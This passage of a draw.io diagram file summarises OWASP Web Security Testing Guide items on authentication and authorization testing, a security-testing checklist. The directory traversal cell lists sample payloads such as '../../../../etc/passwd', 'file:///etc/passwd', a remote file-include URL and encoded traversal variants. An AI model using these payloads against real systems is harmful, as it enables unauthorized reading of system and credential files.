account names and passwords written in comments in the source code.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Try to determine if the system generated password is predictable and guess its pattern.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Try to use blank or the same as username passwords.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Examine the code for hard coded usernames and passwords.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check for configuration files that contain usernames and passwords.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Examine the password policy and, if the application generates its own passwords for new users, check the policy in use for this procedure.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;Burp Intruder&lt;/a&gt;, &lt;a href=&quot;https://github.com/vanhauser-thc/thc-hydra&quot;&gt;THC Hydra&lt;/a&gt;, &lt;a href=&quot;https://www.cirt.net/nikto2&quot;&gt;Nikto 2&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="680" width="400" x="1240" y="620" as="geometry" />
        </mxCell>
        <mxCell id="-YZwyn7ufoJzrK6BvvcU-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHN-03&lt;br&gt;Testing for Weak Lock Out Mechanism&lt;/h1&gt;&lt;p&gt;Account lockout mechanisms require a balance between protecting accounts from unauthorized access and protecting users from being denied authorized access.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Evaluate the&amp;nbsp;Lock Out Mechanism&amp;nbsp;effectiveness (available login attempts and cooling period).&lt;/p&gt;&lt;p&gt;Evaluate CAPTCHA effectiveness by checking verification logic (should be server-side, based on response body, not on the HTTP response code, etc).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Evaluate the unlock mechanism’s resistance to unauthorized account unlocking (unique one-time link, availability for locked accounts only).&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tools:&amp;nbsp;&lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html&quot;&gt;Forgot Password Cheat Sheet&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="340" width="400" x="1240" y="1300" as="geometry" />
        </mxCell>
        <mxCell id="-YZwyn7ufoJzrK6BvvcU-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHN-04&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Bypassing Authentication Schema&lt;br&gt;&lt;/h1&gt;&lt;p&gt;Testing the authentication schema means understanding how the authentication process works and using that information to circumvent the authentication mechanism.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Ensure that authentication is applied across all services that require it.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Direct Page Request (&lt;a href=&quot;https://owasp.org/www-community/attacks/Forced_browsing&quot;&gt;Forced Browsing&lt;/a&gt;)&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Attempt to directly access a different protected pages via URL tampering to test Authentication Schema.&lt;/span&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Parameter modification&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Check request parameters (URL, Cookies, etc) used in logon procedure.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Session ID prediction&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Session ID generation may be predictable, it may lead to finding a valid session ID and gaining unauthorized access to the application, impersonating a previously authenticated user.&lt;/p&gt;&lt;p&gt;&lt;b&gt;SQL injection&lt;/b&gt;&lt;/p&gt;&lt;p&gt;SQL injections in password fields may lead to bypass the authentication.&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://owasp.org/www-project-webgoat/&quot;&gt;WebGoat&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="520" width="400" x="1240" y="1640" as="geometry" />
        </mxCell>
        <mxCell id="-YZwyn7ufoJzrK6BvvcU-3" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHN-05&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Vulnerable Remember Password&lt;/h1&gt;&lt;p&gt;Validate that the generated session is managed securely and do not put the user’s credentials in danger.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Credentials shouldn’t be stored in any way in the client-side application, and should be substitued by tokens generated server-side.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tokens should be analyzed in terms of token-lifetime.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Follow &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html&quot;&gt;session management best practices&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;Ensure that no credentials are stored in clear text or are easily retrievable in encoded or encrypted forms in browser storage mechanisms.&lt;/p&gt;&lt;p&gt;Credentials&amp;nbsp;should be stored server-side and follow &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html&quot;&gt;best password storage practices&lt;/a&gt;.&lt;br&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="360" width="400" x="1240" y="2160" as="geometry" />
        </mxCell>
        <mxCell id="-YZwyn7ufoJzrK6BvvcU-4" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHN-06&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Browser Cache Weaknesses&lt;/h1&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Review if the application stores sensitive information on the client-side.&lt;/li&gt;&lt;li&gt;Review if access can occur without authorization.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Browser History&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check accessto the sensitive information via back button in browser being unauthorized.&lt;/p&gt;&lt;p&gt;Deliver the page over HTTPS and setting.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Browser Cache&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Check the browser instructions in server responses&amp;nbsp;not to cache any sensitive data (&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;i style=&quot;&quot;&gt;Cache-Control: no-cache, no-store,&amp;nbsp;&lt;/i&gt;&lt;i style=&quot;&quot;&gt;must-revalidate, max-age=0, s-maxage=0&lt;/i&gt;; &lt;i style=&quot;&quot;&gt;Expires: 0&lt;/i&gt;; &lt;i style=&quot;&quot;&gt;Pragma: no-cache&lt;/i&gt;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Review cached information via&amp;nbsp;developer tools ot browser extensions.&lt;/p&gt;&lt;p&gt;Check Handling for Mobile Browsers (change User-Agent via proxy).&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;OWASP ZAP&lt;/a&gt;, &lt;a href=&quot;https://www.portswigger.net/burp/&quot;&gt;BurpSuite&lt;/a&gt;.&lt;/p&gt;" vertex="1">
          <mxGeometry height="440" width="400" x="1240" y="2520" as="geometry" />
        </mxCell>
        <mxCell id="-YZwyn7ufoJzrK6BvvcU-5" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHN-07&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Weak Password Policy&lt;/h1&gt;&lt;p&gt;Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;What characters are permitted and forbidden? Check requirement of using different character sets (upper/lower cases, digits, special symbols).&lt;/span&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;How often can a user change their password?&amp;nbsp;How quickly can a user change their password after a previous change?&lt;/p&gt;&lt;p&gt;Check the histpory of previous users&#39; passwords.&lt;/p&gt;&lt;p&gt;How different must the next password be from the last password?&lt;/p&gt;&lt;p&gt;Are the passwords prevented from using username or other easy to guess words?&lt;/p&gt;&lt;p&gt;What are the minimum and maximum password lengths?&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Use 2FA or strong password policy (password length, complexity, reuse and aging) to prevent &lt;a href=&quot;https://owasp.org/www-community/attacks/Brute_force_attack&quot;&gt;brute force attacks&lt;/a&gt;.&lt;br&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="440" width="400" x="1240" y="2960" as="geometry" />
        </mxCell>
        <mxCell id="-YZwyn7ufoJzrK6BvvcU-6" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHN-08&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Weak Security Question Answer&lt;/h1&gt;&lt;p&gt;Often called “secret” questions and answers, security questions and answers are often used to recover forgotten passwords. The most of the questions that websites implement promote answers that are pseudo-private.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Pre-generated Questions&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Known to family members or close friends of the user.&lt;br&gt;Easily guessable / brute forcible / publicly discoverable.&lt;/p&gt;&lt;p&gt;Try to obtain a list of security questions and devide them into categories (guessed, brute-forced, available on social media, etc).&lt;/p&gt;&lt;p&gt;&lt;b&gt;Self-generated Questions&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Lack of complexity control.&lt;/p&gt;&lt;p&gt;Find weak self-generated questions via enumeration / brute forcing.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Determine a number of incorrectly supplied security answers trigger a lockout mechanism.&lt;br&gt;&lt;/p&gt;&lt;p&gt;Find out the number of security questions in process.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Brute forcing&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Does the password reset allow unlimited attempts?&lt;/p&gt;&lt;p&gt;Is there a lockout period after X incorrect answers?&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Follow the &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html&quot;&gt;OWASP Security Questions Cheat Sheet&lt;/a&gt; recommendation.&lt;br&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="580" width="400" x="1240" y="3400" as="geometry" />
        </mxCell>
        <mxCell id="-YZwyn7ufoJzrK6BvvcU-7" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHN-09&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Weak Password Change or Reset Functionalities&lt;/h1&gt;&lt;p&gt;Determine the resistance of the application to subversion of the account change process allowing someone to change the password of an account.&lt;/p&gt;&lt;p&gt;Determine the resistance of the passwords reset functionality against guessing or bypassing.&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Check&amp;nbsp;&lt;span style=&quot;background-color: transparent;&quot;&gt;if users, other than administrators, can change or reset passwords for accounts other than their own.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Check&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;if users can manipulate or subvert the password change or reset process to change or reset the password of another user or administrator.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Check&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;if the password change or reset process is vulnerable to CSRF.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Test Password Reset&lt;/b&gt;&lt;/p&gt;&lt;p&gt;What information is required to reset the password?&lt;/p&gt;&lt;p&gt;How are reset passwords communicated to the user?&lt;/p&gt;&lt;p&gt;Are reset passwords generated randomly?&lt;/p&gt;&lt;p&gt;Is the reset password functionality requesting confirmation before changing the password?&lt;/p&gt;&lt;p&gt;&lt;b&gt;Test Password Change&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Is the old password requested to complete the change?&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;The password change or reset function is a sensitive function and requires some form of protection, such as requiring users to re-authenticate or presenting the user with confirmation screens during the process.&lt;/p&gt;&lt;p&gt;Follow the &lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html&quot;&gt;OWASP Forgot Password Cheat Sheet&lt;/a&gt; recommendation.&lt;br&gt;&lt;/p&gt;" vertex="1">
          <mxGeometry height="660" width="400" x="1240" y="3980" as="geometry" />
        </mxCell>
        <mxCell id="Pam5j0-aDW3yzhkfkwOQ-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHN-10&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Weaker Authentication in Alternative Channel&lt;/h1&gt;&lt;p&gt;The alternative user interaction channels could be utilized to circumvent the primary channel, or expose information that can then be used to assist an attack against the primary channel (&lt;i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Standard website -&amp;gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Mobile/&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Accessibility&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&amp;nbsp;optimized website /&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Alternative country/language websites / Test&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;versions of the standard website /&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Mobile device app /&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Desktop application /&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Call center operators&lt;/span&gt;&lt;/i&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Standard website -&amp;gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;https://www.example.com/myaccount/&lt;br&gt;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Mobile optimized website -&amp;gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;http://m.example.com/myaccount/&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&lt;br&gt;&lt;/span&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Identify alternative authentication channels.&lt;/li&gt;&lt;li&gt;Assess the security measures used and if any bypasses exists on the alternative channels.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Fully test the website’s primary authentication functions, then identify other channels:&lt;/p&gt;&lt;p&gt;Reading site content (&lt;i&gt;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;home page&lt;/span&gt;, &lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;contact us&lt;/span&gt;, &lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;help pages&lt;/span&gt;, &lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;support articles&lt;/span&gt;, &lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;FAQs&lt;/span&gt;, &lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;robots.txt&lt;/span&gt;, &lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;sitemap.xml&lt;/span&gt;, etc&lt;/i&gt;).&lt;br&gt;Searching HTTP proxy logs (&lt;i&gt;“&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;mobile&lt;/span&gt;”, “&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;android&lt;/span&gt;”, &quot;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;blackberry&lt;/span&gt;”, “&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;ipad&lt;/span&gt;”, “&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;iphone&lt;/span&gt;”, “&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;mobile app&lt;/span&gt;”, “&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;e-reader&lt;/span&gt;”, “&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;wireless&lt;/span&gt;”, “&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;auth&lt;/span&gt;”, “&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;sso&lt;/span&gt;”, “&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;single sign on&lt;/span&gt;”&lt;/i&gt;).&lt;br&gt;Use search engines (different websites from the same organization).&lt;br&gt;&lt;/p&gt;&lt;p&gt;For each alternative channel where user accounts or functionality are shared, identify if all the authentication functions of the primary channel are available, and if anything extra exists.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;Ensure a consistent authentication policy is applied across all channels so that they are equally secure.&lt;/p&gt;" vertex="1">
          <mxGeometry height="600" width="400" x="1240" y="4640" as="geometry" />
        </mxCell>
        <mxCell id="3G3GeKaq7hqGOafV3clc-1" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;whiteSpace=wrap;fontFamily=Times New Roman;perimeter=rectanglePerimeter;fixDash=0;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHZ-01&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing Directory Traversal File Include&lt;/h1&gt;&lt;p&gt;Using input validation methods that have not been well designed or deployed, an aggressor could exploit the system in order to read or write files that are not intended to be accessible.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot;&gt;&lt;p&gt;&lt;b&gt;Input Vectors Enumeration&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;In order to determine which part of the application is vulnerable to input validation bypassing, the tester needs to enumerate all parts of the application that accept content from the user (request parameters which could be used for file-related operations, unusual file extensions, interesting variable names, cookies used by the web application for the dynamic generation of pages or templates).&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Testing Techniques&lt;/b&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com/getUserProfile.jsp?&lt;b style=&quot;&quot;&gt;item=../../../../etc/passwd&lt;/b&gt;&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Cookie: USER=1826cc8f:&lt;b style=&quot;&quot;&gt;PSTYLE=../../../../etc/passwd&lt;/b&gt;&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com/index.php?&lt;b style=&quot;&quot;&gt;file=http://www.owasp.org/malicioustxt&lt;/b&gt;&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com/index.php?&lt;b style=&quot;&quot;&gt;file=file:///etc/passwd&lt;/b&gt;&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com/index.php?&lt;b style=&quot;&quot;&gt;file=http://localhost:8080&lt;/b&gt;&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com/index.php?&lt;b style=&quot;&quot;&gt;file=http://192.168.0.2:9080&lt;/b&gt;&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;http://example.com/main.cgi?&lt;b style=&quot;&quot;&gt;home=main.cgi&lt;/b&gt;&lt;/i&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;There are different separators in different OS (&quot;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;\&lt;/span&gt;&quot;, &quot;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;/&lt;/span&gt;&quot;, &quot;&lt;span style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;:&lt;/span&gt;&quot;, drive letters).&lt;/p&gt;&lt;div&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;URL (+ double) encoding (&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;&quot;&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b style=&quot;&quot;&gt;%2e%2e&lt;/b&gt;/&lt;/i&gt;&quot; -&amp;gt; &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;&lt;b style=&quot;&quot;&gt;..&lt;/b&gt;/&lt;/i&gt;&quot;, &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;..&lt;b style=&quot;&quot;&gt;%2f&lt;/b&gt;&lt;/i&gt;&quot; -&amp;gt; &quot;&lt;i style=&quot;&quot;&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;../&lt;/b&gt;&lt;/i&gt;&quot;,&amp;nbsp;&quot;&lt;i style=&quot;&quot;&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;%2e%2e%2f&lt;/b&gt;&lt;/i&gt;&quot; -&amp;gt; &quot;&lt;i style=&quot;&quot;&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;../&lt;/b&gt;&lt;/i&gt;&quot;, &quot;&lt;i style=&quot;&quot;&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;%252e%252e%255c&lt;/b&gt;&lt;/i&gt;&quot; -&amp;gt; &quot;&lt;i style=&quot;&quot;&gt;&lt;b style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;..\&lt;/b&gt;&lt;/i&gt;&quot;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;br&gt;&lt;/div&gt;&lt;p&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Unicode/UTF-8 Encoding (&quot;&lt;/span&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;..&lt;b style=&quot;&quot;&gt;%c0%af&lt;/b&gt;&lt;/i&gt;&quot; -&amp;gt; &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;..&lt;b style=&quot;&quot;&gt;/&lt;/b&gt;&lt;/i&gt;&quot;, &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;..&lt;b style=&quot;&quot;&gt;%c1%9c&lt;/b&gt;&lt;/i&gt;&quot; -&amp;gt; &quot;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;..&lt;b style=&quot;&quot;&gt;\&lt;/b&gt;&lt;/i&gt;&quot;&lt;span style=&quot;background-color: transparent;&quot;&gt;).&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Code review to search common patterns (&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;java.io.File()&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;java.io.FileReader()&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;include()&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;require()&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;fopen()&lt;/i&gt;, &lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;readfile()&lt;/i&gt;).&lt;/p&gt;&lt;p&gt;Tools: &lt;a href=&quot;https://searchcode.com/&quot;&gt;Searchcode&lt;/a&gt;, &lt;a href=&quot;https://github.com/wireghoul/dotdotpwn&quot;&gt;DotDotPwn&lt;/a&gt;, &lt;a href=&quot;https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt&quot;&gt;Path Traversal vocabulary&lt;/a&gt;, &lt;a href=&quot;https://www.zaproxy.org/&quot;&gt;ZAP&lt;/a&gt;, &lt;a href=&quot;https://portswigger.net/&quot;&gt;Burp Suite&lt;/a&gt;, &lt;a href=&quot;https://www.gnu.org/software/grep/&quot;&gt;grep&lt;/a&gt;, &lt;a href=&quot;https://wiki.owasp.org/index.php/Category:OWASP_DirBuster_Project&quot;&gt;DirBuster&lt;/a&gt;,&amp;nbsp;Enconding/Decoding tools/services.&lt;/p&gt;" vertex="1">
          <mxGeometry height="640" width="400" x="1640" y="80" as="geometry" />
        </mxCell>
        <mxCell id="3G3GeKaq7hqGOafV3clc-2" parent="1" style="text;html=1;overflow=visible;rounded=0;strokeColor=default;fontFamily=Times New Roman;whiteSpace=wrap;align=left;autosize=0;expand=1;fixedWidth=0;resizable=1;" value="&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;WSTG-ATHZ-02&lt;/h1&gt;&lt;h1 style=&quot;margin-top: 0px;&quot;&gt;Testing for Bypassing Authorization Schema&lt;/h1&gt;&lt;p style=&quot;&quot;&gt;This kind of test focuses on verifying how the authorization schema has been implemented for each role or privilege to get access to reserved functions and resources.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot; style=&quot;&quot;&gt;&lt;p style=&quot;&quot;&gt;Assess if horizontal or vertical access is possible.&lt;br&gt;&lt;/p&gt;&lt;hr id=&quot;null&quot; style=&quot;&quot;&gt;&lt;p style=&quot;&quot;&gt;&lt;b&gt;Testing for Horizontal Bypassing Authorization Schema&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;div style=&quot;&quot;&gt;&lt;ol&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Register or generate two users with identical privileges.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Establish and keep two different sessions active (one for each user).&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;For every request, change the relevant parameters and the session identifier from token one to token two and diagnose the responses for each token.&lt;/span&gt;&lt;/li&gt;&lt;li&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;An application will be considered vulnerable if the responses are the same, contain same private data or indicate successful operation on other users’ resource or data.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/div&gt;&lt;p&gt;&lt;/p&gt;&lt;p style=&quot;&quot;&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;Lateral movement attack (&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;attacker’s response contain the data of the example_user&lt;/span&gt;&lt;span style=&quot;background-color: transparent;&quot;&gt;):&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;div style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;POST /account/viewSettings HTTP/1.1&lt;/i&gt;&lt;/div&gt;&lt;i&gt;&lt;div style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Host: www.example.com&lt;/i&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;[other HTTP headers]&lt;/i&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 200);&quot;&gt;Cookie: SessionID=&lt;b&gt;USER_SESSION&lt;/b&gt;&lt;/i&gt;&lt;/div&gt;&lt;div style=&quot;&quot;&gt;&lt;i style=&quot;background-color: rgb(200, 200, 